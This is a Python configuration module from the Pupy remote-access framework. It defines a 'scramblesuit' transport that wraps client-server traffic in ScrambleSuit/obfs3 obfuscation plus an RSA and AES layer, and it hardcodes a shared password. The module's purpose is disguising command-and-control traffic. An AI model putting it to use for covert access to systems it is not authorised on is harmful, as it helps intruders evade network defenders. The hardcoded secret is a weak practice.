# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from network.transports import Transport
from network.lib import *
from network.lib.transports.scramblesuit.scramblesuit import ScrambleSuitClient, ScrambleSuitServer

#scramblesuit password must be 20 char long
scramblesuit_passwd="th!s_iS_pupy_sct_k3y"

class TransportConf(Transport):
    info = "TCP transport using obfsproxy's obfs3 transport with a extra rsa+aes layer",
    name = "scramblesuit"
    server = PupyTCPServer
    client = PupyTCPClient
    stream = PupySocketStream
    client_transport = chain_transports(
            ScrambleSuitClient,
            RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
        )
    server_transport = chain_transports(
            ScrambleSuitServer,
            RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
        )
    client_transport_kwargs= {"password":scramblesuit_passwd} 
    server_transport_kwargs= {"password":scramblesuit_passwd}


